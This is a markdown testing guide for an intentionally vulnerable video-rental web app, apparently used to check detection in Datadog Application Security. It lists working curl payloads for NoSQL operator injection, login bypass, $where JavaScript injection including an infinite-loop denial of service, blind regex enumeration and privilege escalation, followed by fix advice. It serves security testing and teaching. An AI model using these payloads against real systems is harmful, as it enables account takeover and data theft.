# NoSQL Injection Vulnerabilities - Testing Guide

## ⚠️ WARNING

This application contains **INTENTIONAL security vulnerabilities** for:
- Security testing with Datadog Application Security
- Learning about NoSQL injection attacks
- Demonstrating detection capabilities

**DO NOT deploy this to production or use with real data!**

## Datadog User Tracking

The application now includes Datadog user tracking instrumentation:

### What's Tracked
- **User ID**: Unique identifier from MongoDB
- **Email**: User's email address
- **Name**: Username
- **Role**: User role (user/admin)

### Where It's Tracked
1. **User Registration** - `POST /api/auth/register`
2. **User Login** - `POST /api/auth/login`
3. **All Authenticated Requests** - Via `authenticate` middleware

### Implementation
```javascript
const span = tracer.scope().active();
if (span) {
  span.setUser({
    id: user._id.toString(),
    email: user.email,
    name: user.username,
    role: user.role
  });
}
```

This allows Datadog ASM to:
- Attribute security events to specific users
- Track attacker behavior
- Identify compromised accounts
- Correlate attacks across sessions

## Vulnerable Endpoints

Base URL: `http://localhost:5000/api/vulnerable`

### 1. User Search Injection

**Endpoint**: `GET /api/vulnerable/search-user`

**Vulnerability**: Direct use of user input in MongoDB query

**Attack Examples**:

```bash
# List all users
curl "http://localhost:5000/api/vulnerable/search-user?username[\$ne]=null"

# Find users starting with "admin"
curl "http://localhost:5000/api/vulnerable/search-user?username[\$regex]=^admin"

# Find users NOT named "john"
curl "http://localhost:5000/api/vulnerable/search-user?username[\$ne]=john"
```

**Expected Detection**: Datadog ASM should detect the NoSQL injection operators

---

### 2. Authentication Bypass

**Endpoint**: `POST /api/vulnerable/insecure-login`

**Vulnerability**: Direct query matching password without hashing

**Attack Example**:

```bash
# Bypass password check
curl -X POST http://localhost:5000/api/vulnerable/insecure-login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com",
    "password": {"$ne": null}
  }'

# Login as any user
curl -X POST http://localhost:5000/api/vulnerable/insecure-login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$regex": "admin"},
    "password": {"$ne": ""}
  }'
```

**Impact**: Complete authentication bypass

---

### 3. JavaScript Injection via $where

**Endpoint**: `GET /api/vulnerable/search-movies-where`

**Vulnerability**: Arbitrary JavaScript execution on database

**Attack Examples**:

```bash
# Execute arbitrary JavaScript
curl "http://localhost:5000/api/vulnerable/search-movies-where?title=1;%20return%20true;%20//"

# Extract data
curl "http://localhost:5000/api/vulnerable/search-movies-where?title=';%20return%20this.title;%20//'"

# DOS attack with infinite loop
curl "http://localhost:5000/api/vulnerable/search-movies-where?title=';%20while(true)%20{};%20//'"
```

**Impact**: Remote code execution on database server

---

### 4. Query Operator Injection

**Endpoint**: `GET /api/vulnerable/movies-by-price`

**Vulnerability**: Unsanitized query operators

**Attack Examples**:

```bash
# Extract all movies regardless of price
curl "http://localhost:5000/api/vulnerable/movies-by-price?minPrice[\$gt]=0&maxPrice[\$lt]=999999"

# Use $ne to match all
curl "http://localhost:5000/api/vulnerable/movies-by-price?minPrice[\$ne]=null&maxPrice[\$ne]=null"

# Complex operator injection
curl "http://localhost:5000/api/vulnerable/movies-by-price?minPrice[\$gte]=0&maxPrice[\$regex]=.*"
```

**Impact**: Data extraction, query manipulation

---

### 5. Broken Access Control

**Endpoint**: `GET /api/vulnerable/rentals-insecure`

**Vulnerability**: Using user-provided ID instead of authenticated user

**Attack Examples**:

```bash
# Get your token first
TOKEN="your-jwt-token-here"

# Access all rentals
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/vulnerable/rentals-insecure?userId[\$ne]=null"

# Access specific user's rentals
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/vulnerable/rentals-insecure?userId=507f1f77bcf86cd799439011"
```

**Impact**: Access other users' sensitive data

---

### 6. User Enumeration via Regex

**Endpoint**: `GET /api/vulnerable/user-exists`

**Vulnerability**: Regex injection for user enumeration

**Attack Examples**:

```bash
# Check if admin users exist
curl "http://localhost:5000/api/vulnerable/user-exists?email[\$regex]=^admin"

# Extract email patterns
curl "http://localhost:5000/api/vulnerable/user-exists?email[\$regex]=.*@company.com"

# Boolean-based blind injection
# Test character by character to extract data
curl "http://localhost:5000/api/vulnerable/user-exists?email[\$regex]=^a"
curl "http://localhost:5000/api/vulnerable/user-exists?email[\$regex]=^ad"
curl "http://localhost:5000/api/vulnerable/user-exists?email[\$regex]=^adm"
```

**Impact**: User enumeration, data extraction

---

### 7. Blind NoSQL Injection

**Endpoint**: `GET /api/vulnerable/search-slow`

**Vulnerability**: Time-based blind injection

**Attack Examples**:

```bash
# Time-based detection
curl "http://localhost:5000/api/vulnerable/search-slow?genre[\$where]=sleep(5000)||this.genre=='Action'"

# Extract data bit by bit
curl "http://localhost:5000/api/vulnerable/search-slow?genre[\$ne]=null"
```

**Impact**: Data extraction through timing attacks

---

### 8. Privilege Escalation

**Endpoint**: `POST /api/vulnerable/update-profile-insecure`

**Vulnerability**: No validation on update operations

**Attack Examples**:

```bash
TOKEN="your-jwt-token-here"

# Elevate your own privileges to admin
curl -X POST http://localhost:5000/api/vulnerable/update-profile-insecure \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "your-user-id",
    "updateData": {"role": "admin"}
  }'

# Modify another user's account
curl -X POST http://localhost:5000/api/vulnerable/update-profile-insecure \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "victim-user-id",
    "updateData": {"email": "hacked@evil.com"}
  }'
```

**Impact**: Privilege escalation, account takeover

---

## Testing with Datadog ASM

### 1. Enable Datadog Application Security

Ensure your `.env` has:
```
DD_APPSEC_ENABLED=true
DD_API_KEY=your-datadog-api-key
```

### 2. Run the Application

```bash
cd video-rental-store
docker-compose up -d
```

### 3. Execute Attacks

Use the curl commands above to trigger the vulnerabilities.

### 4. View Results in Datadog

1. Go to https://app.datadoghq.com
2. Navigate to **Security** > **Application Security**
3. Look for:
   - **Security Signals**: Detected attacks
   - **Traces**: Individual attack attempts
   - **Attackers**: IPs and users performing attacks
   - **Vulnerabilities**: Known security issues

### 5. User Tracking in Action

You'll see:
- Which users triggered vulnerabilities
- User behavior patterns
- Attack attribution to specific accounts
- Session tracking across requests

---

## Attack Scenarios

### Scenario 1: Account Enumeration

```bash
# Enumerate users systematically
for char in {a..z}; do
  curl "http://localhost:5000/api/vulnerable/user-exists?email[\$regex]=^$char"
done
```

### Scenario 2: Complete Authentication Bypass

```bash
# Step 1: Find an admin email
curl "http://localhost:5000/api/vulnerable/search-user?username[\$regex]=^admin"

# Step 2: Bypass authentication
curl -X POST http://localhost:5000/api/vulnerable/insecure-login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@store.com", "password": {"$ne": null}}'
```

### Scenario 3: Data Exfiltration

```bash
# Extract all users
curl "http://localhost:5000/api/vulnerable/search-user?username[\$ne]=null"

# Extract all movies
curl "http://localhost:5000/api/vulnerable/movies-by-price?minPrice[\$gte]=0&maxPrice[\$lte]=9999"

# Extract all rentals (requires auth token)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:5000/api/vulnerable/rentals-insecure?userId[\$ne]=null"
```

### Scenario 4: Privilege Escalation

```bash
# Register normal user
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "email": "attacker@evil.com", "password": "pass123"}'

# Login and get token
TOKEN=$(curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com", "password": "pass123"}' | jq -r '.token')

# Escalate to admin
curl -X POST http://localhost:5000/api/vulnerable/update-profile-insecure \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"userId\": \"USER_ID_HERE\", \"updateData\": {\"role\": \"admin\"}}"
```

---

## Expected Datadog Detections

### Security Signals You Should See

1. **NoSQL Injection** - Query operator injection detected
2. **Code Injection** - JavaScript execution via $where
3. **Broken Access Control** - Unauthorized data access
4. **User Enumeration** - Systematic user discovery
5. **Authentication Bypass** - Login without credentials

### User Tracking Benefits

With user tracking enabled, you'll see:
- **User ID**: `507f1f77bcf86cd799439011`
- **Email**: `attacker@evil.com`
- **Name**: `attacker`
- **Role**: `user` (or `admin` after escalation)

This allows you to:
- Track the attacker's journey
- Identify compromised accounts
- Correlate multiple attack vectors
- Block specific users
- Investigate post-incident

---

## Prevention (How to Fix)

### 1. Input Validation

```javascript
// Bad
const user = await User.findOne({ email: req.query.email });

// Good
const email = String(req.query.email);
if (!/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
  return res.status(400).json({ error: 'Invalid email' });
}
const user = await User.findOne({ email: email });
```

### 2. Sanitize User Input

```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());
```

### 3. Never Use $where

```javascript
// Never do this
Movie.find({ $where: `this.title == '${userInput}'` })

// Do this instead
Movie.find({ title: userInput })
```

### 4. Use Parameterized Queries

```javascript
// Mongoose automatically sanitizes when using direct values
User.findOne({ email: email, password: hashedPassword })
```

### 5. Validate Object Types

```javascript
if (typeof req.query.email !== 'string') {
  return res.status(400).json({ error: 'Invalid input type' });
}
```

---

## Summary

Your application now has:
- ✅ **Datadog User Tracking** - Track who does what
- ✅ **8 Vulnerable Endpoints** - For security testing
- ✅ **NoSQL Injection Examples** - Learn attack patterns
- ✅ **Datadog ASM Integration** - Real-time detection
- ✅ **Attack Scenarios** - Practice exploitation
- ✅ **Prevention Guidance** - Learn how to fix

Use these vulnerabilities to:
1. Test Datadog Application Security
2. Learn about NoSQL injection
3. Train security teams
4. Demonstrate detection capabilities
5. Understand user attribution in attacks

**Remember**: These are intentional vulnerabilities for education and testing only!
